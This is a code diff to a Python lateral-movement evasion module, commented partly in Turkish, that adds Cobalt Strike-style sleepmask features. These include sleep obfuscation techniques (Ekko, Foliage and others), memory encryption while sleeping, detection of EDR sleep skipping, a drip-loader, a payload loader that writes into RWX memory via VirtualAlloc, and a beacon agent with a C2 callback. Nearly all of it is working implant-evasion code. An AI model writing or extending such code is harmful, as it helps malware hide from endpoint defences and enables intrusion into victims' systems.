@@ -60,6 +60,22 @@ try:
 except ImportError:
     HAS_BYPASS_LAYER = False
 
+# NEW: Sleepmask & Runtime Masking modülü
+try:
+    from evasion.sleep_masking import (
+        SleepmaskEngine,
+        SleepmaskConfig,
+        SleepTechnique,
+        MaskingMode,
+        RuntimeMaskingCycle,
+        BeaconSleepAgent,
+        DripLoader,
+        SleepSkipDetector,
+    )
+    HAS_SLEEPMASK = True
+except ImportError:
+    HAS_SLEEPMASK = False
+
 
 class EvasionProfile(Enum):
     """Predefined evasion profiles"""
@@ -191,6 +207,19 @@ class EvasionConfig:
     reencrypt_on_wake: bool = True  # Decrypt-run-reencrypt cycle
     memory_guard_on_sleep: bool = False  # PAGE_NOACCESS when sleeping
     
+    # NEW: Sleepmask & Runtime Masking (Cobalt Strike Beacon tarzı)
+    use_sleepmask: bool = False  # Default: paranoid profile için True
+    sleepmask_technique: str = "ekko"  # ekko, foliage, death_sleep, zilean
+    sleepmask_masking_mode: str = "xor"  # xor, rc4, chacha20
+    sleepmask_encrypt_heap: bool = True
+    sleepmask_set_noaccess: bool = True  # PAGE_NOACCESS during sleep
+    sleepmask_check_sleep_skip: bool = True  # Detect EDR sleep skip
+    
+    # NEW: Drip-loader (slow memory loading)
+    use_drip_loader: bool = False  # Yavaş memory yükleme
+    drip_chunk_size: int = 4096
+    drip_delay_ms: int = 100
+    
     # Traffic obfuscation
     encrypt_traffic: bool = True
     encryption_key: str = ""
@@ -224,6 +253,11 @@ class LateralEvasionLayer:
         # NEW: bypass_amsi_etw entegrasyonu
         self.bypass_manager = None
         self.defense_analysis: Optional[DefenseAnalysis] = None
+        
+        # NEW: Sleepmask engine
+        self.sleepmask_engine = None
+        self.runtime_masking = None
+        self.drip_loader = None
         
         self._init_evasion_modules()
     
@@ -269,6 +303,49 @@ class LateralEvasionLayer:
                 self._log(f"Bypass manager initialized (layer: {self.config.bypass_layer})")
             except Exception as e:
                 self._log(f"Failed to init bypass manager: {e}")
+        
+        # NEW: Sleepmask & Runtime Masking
+        if HAS_SLEEPMASK and self.config.use_sleepmask:
+            try:
+                # SleepTechnique mapping
+                technique_map = {
+                    "ekko": SleepTechnique.EKKO,
+                    "foliage": SleepTechnique.FOLIAGE,
+                    "death_sleep": SleepTechnique.DEATH_SLEEP,
+                    "zilean": SleepTechnique.ZILEAN,
+                }
+                mode_map = {
+                    "xor": MaskingMode.XOR,
+                    "rc4": MaskingMode.RC4,
+                    "chacha20": MaskingMode.CHACHA20,
+                }
+                
+                sleepmask_config = SleepmaskConfig(
+                    technique=technique_map.get(self.config.sleepmask_technique, SleepTechnique.EKKO),
+                    masking_mode=mode_map.get(self.config.sleepmask_masking_mode, MaskingMode.XOR),
+                    min_sleep_ms=self.config.min_sleep_ms,
+                    max_sleep_ms=self.config.max_sleep_ms,
+                    jitter_percent=self.config.jitter_percent,
+                    encrypt_heap=self.config.sleepmask_encrypt_heap,
+                    set_noaccess=self.config.sleepmask_set_noaccess,
+                    check_sleep_skip=self.config.sleepmask_check_sleep_skip,
+                    use_drip_loader=self.config.use_drip_loader,
+                    drip_chunk_size=self.config.drip_chunk_size,
+                    drip_delay_ms=self.config.drip_delay_ms,
+                )
+                
+                self.sleepmask_engine = SleepmaskEngine(sleepmask_config)
+                self.runtime_masking = RuntimeMaskingCycle(self.sleepmask_engine)
+                
+                if self.config.use_drip_loader:
+                    self.drip_loader = DripLoader(
+                        self.config.drip_chunk_size,
+                        self.config.drip_delay_ms
+                    )
+                
+                self._log(f"Sleepmask initialized (technique: {self.config.sleepmask_technique})")
+            except Exception as e:
+                self._log(f"Failed to init sleepmask: {e}")
     
     def analyze_target_defenses(self) -> Optional[Dict[str, Any]]:
         """
@@ -383,6 +460,158 @@ class LateralEvasionLayer:
             result["ready"] = True  # Continue anyway
             
         return result
+    
+    # ============================================================
+    # SLEEPMASK & RUNTIME MASKING METHODS
+    # ============================================================
+    
+    def masked_sleep(self, sleep_ms: int = None, regions: List[Tuple[int, int]] = None) -> Dict[str, Any]:
+        """
+        Sleepmask ile uyku - Memory encrypted during sleep
+        
+        Args:
+            sleep_ms: Uyku süresi (ms), None = config'den
+            regions: Maskelenecek memory bölgeleri [(addr, size), ...]
+        
+        Returns:
+            Dict: Sleep sonucu (success, actual_ms, skip_detected, etc.)
+        """
+        if not self.sleepmask_engine:
+            # Fallback: Normal sleep
+            import time
+            actual_sleep = sleep_ms or self.config.min_sleep_ms
+            time.sleep(actual_sleep / 1000.0)
+            return {
+                "success": True,
+                "actual_sleep_ms": actual_sleep,
+                "skip_detected": False,
+                "technique_used": "basic"
+            }
+        
+        actual_sleep = sleep_ms or random.randint(
+            self.config.min_sleep_ms,
+            self.config.max_sleep_ms
+        )
+        
+        result = self.sleepmask_engine.masked_sleep(actual_sleep, regions)
+        
+        if result.get("skip_detected"):
+            self._log(f"⚠️ Sleep skip detected: {result.get('skip_reason')}")
+            self._handle_sleep_anomaly(result)
+        
+        return result
+    
+    def _handle_sleep_anomaly(self, sleep_result: Dict):
+        """
+        Sleep anomaly tespit edildiğinde tepki
+        AI guidance ile alternatif injection öner
+        """
+        self._log("Sleep anomaly detected - considering alternative evasion")
+        
+        # Alternatif sleep tekniği dene
+        if self.sleepmask_engine:
+            current = self.sleepmask_engine.config.technique
+            alternatives = [
+                SleepTechnique.DEATH_SLEEP,
+                SleepTechnique.ZILEAN,
+                SleepTechnique.FOLIAGE,
+            ]
+            
+            for alt in alternatives:
+                if alt != current:
+                    self.sleepmask_engine.config.technique = alt
+                    self._log(f"Switched to sleep technique: {alt.value}")
+                    break
+    
+    def execute_with_masking(self, func, *args, **kwargs):
+        """
+        Fonksiyonu masking cycle içinde çalıştır
+        decrypt → execute → re-encrypt
+        
+        Args:
+            func: Çalıştırılacak fonksiyon
+            *args, **kwargs: Argümanlar
+        
+        Returns:
+            Fonksiyon sonucu
+        """
+        if not self.runtime_masking:
+            return func(*args, **kwargs)
+        
+        return self.runtime_masking.execute_with_masking(func, *args, **kwargs)
+    
+    def drip_load_payload(self, payload: bytes, target_addr: int = None) -> Tuple[bool, int]:
+        """
+        Payload'ı yavaş yavaş memory'ye yükle (Drip-loader)
+        
+        Args:
+            payload: Yüklenecek payload
+            target_addr: Hedef adres (None = auto-allocate)
+        
+        Returns:
+            Tuple[bool, int]: (success, loaded_address)
+        """
+        if not self.drip_loader:
+            # Normal allocation
+            import ctypes
+            try:
+                addr = ctypes.windll.kernel32.VirtualAlloc(
+                    0, len(payload), 0x3000, 0x40
+                )
+                if addr:
+                    ctypes.memmove(addr, payload, len(payload))
+                    return True, addr
+            except:
+                pass
+            return False, 0
+        
+        try:
+            # Drip allocate
+            if target_addr is None:
+                target_addr = self.drip_loader.drip_allocate(len(payload))
+            
+            if not target_addr:
+                return False, 0
+            
+            # Drip write
+            def progress_cb(percent, chunks):
+                if percent % 25 == 0:
+                    self._log(f"Drip loading: {percent:.0f}% ({chunks} chunks)")
+            
+            success = self.drip_loader.drip_write(target_addr, payload, progress_cb)
+            return success, target_addr if success else 0
+            
+        except Exception as e:
+            self._log(f"Drip load error: {e}")
+            return False, 0
+    
+    def get_sleepmask_metrics(self) -> Dict[str, Any]:
+        """Sleepmask metrikleri"""
+        if not self.sleepmask_engine:
+            return {"enabled": False}
+        
+        return {
+            "enabled": True,
+            **self.sleepmask_engine.get_metrics()
+        }
+    
+    def create_beacon_sleep_agent(self, c2_callback=None) -> Optional['BeaconSleepAgent']:
+        """
+        Test için beacon sleep agent oluştur
+        
+        Args:
+            c2_callback: Check-in callback fonksiyonu
+        
+        Returns:
+            BeaconSleepAgent instance
+        """
+        if not HAS_SLEEPMASK:
+            return None
+        
+        return BeaconSleepAgent(
+            c2_callback=c2_callback,
+            config=self.sleepmask_engine.config if self.sleepmask_engine else None
+        )
     
     def prepare_beacon_payload(self, beacon_type: str, beacon_config: Dict) -> bytes:
         """
